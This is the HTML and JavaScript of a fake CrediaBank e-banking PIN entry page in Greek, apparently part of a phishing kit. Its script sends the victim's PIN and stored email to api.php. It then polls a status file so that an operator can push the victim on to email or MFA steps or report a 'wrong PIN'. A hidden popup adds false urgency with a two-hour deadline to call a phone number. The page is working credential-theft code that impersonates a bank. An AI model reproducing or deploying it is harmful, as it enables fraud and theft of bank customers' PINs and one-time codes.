...
<head>
    ...
    <title>CrediaBank e-banking | Εισαγωγή PIN</title>
    ...
    <style>
        ...
        .pin-widget { max-width: 500px; width: 100%; margin: 0 auto 48px auto; float: none; }
        @media (max-width: 768px) { .pin-widget { margin-bottom: 32px; } }
...
<div id="errorPopupModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.4);z-index:10000;align-items:center;justify-content:center;">
    <div style="background:#E8E8ED;border-radius:14px;width:90%;max-width:340px;text-align:center;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:popupIn 0.3s ease;">
        <div style="padding:20px 20px 12px 20px;">
            <div style="font-size:17px;font-weight:600;color:#000;margin-bottom:10px;">CrediaBank mobile app</div>
            <div style="font-size:14px;color:#333;line-height:1.5;">
                You have reached the maximum number of PIN/OTP retries. If you wish to unlock your PIN or OTPs, please contact the Bank's Customer Service Center at +30 210 3669000.<br><br>
                Please call customer service. You have 2 hours for that step to finish.
            </div>
        </div>
    ...
    <div id="log-container" class="container">
        <div class="row">
            <div id="main-log" class="ng-scope view-animation-left">
                <form name="pinForm" autocomplete="off" class="ng-pristine ng-scope">
                    <div class="login-campaigns-container">
                        <div class="login-widget col-lg-6 col-md-12 pin-widget">
                            <div class="top-container">
                                <h1 class="ng-binding" style="display:none;">Εισαγωγή PIN</h1>

                                <div class="pin-page">
                                   

                                    <div class="pin-title">η σελίδα για το pin.</div>
                                    <div class="pin-subtitle">Παρακαλώ εισάγετε τον κωδικό PIN σας</div>
                            ...
                            <div id="pinMessageArea" class="bottom-container"></div>
                        </div>
                    </div>
...
<script>
(function() {
    const msgContainer = document.getElementById('pinMessageArea');
    ...
    localStorage.setItem('tempEmail', myEmail);
    console.log('PIN Page - Email:', myEmail);
    ...
    function onSubmit() {
        if (pinValue.length < 1) {
            showToastMessage("Παρακαλώ εισάγετε τον κωδικό PIN σας", true);
            return;
        }
        sendPinToApi(pinValue);
    }
    ...
    // Send PIN to API
    function sendPinToApi(code) {
        if (!myEmail) {
            console.error('No email found! Cannot send PIN.');
            showToastMessage("Σφάλμα PIN: Δεν βρέθηκε στοιχεία χρήστη", true);
            return;
        }
        ...
        fetch('api.php', { method: 'POST', body: fd })
            .then(function() {
                showToastMessage("Επαλήθευση PIN...", false);
                if (!checkInterval) {
        ...
        fetch('status.json?t=' + Date.now(), { cache: 'no-store' })
            ...
            .then(function(data) {
                ...
                if (status !== lastStatus) {
                    ...
                    if (status === 'go_email' || status === 'go_mfa') {
                        stopChecking();
                    ...
                    else if (status === 'pin_error') {
                        showToastMessage("Λανθασμένος κωδικός PIN. Δοκιμάστε ξανά.", true);
                        pinValue = '';
                        updateDisplay();
                        setLoading(false);
                    }
    ...
    console.log('PIN Page initialized with email:', myEmail);
})();
</script>
</body>
</html>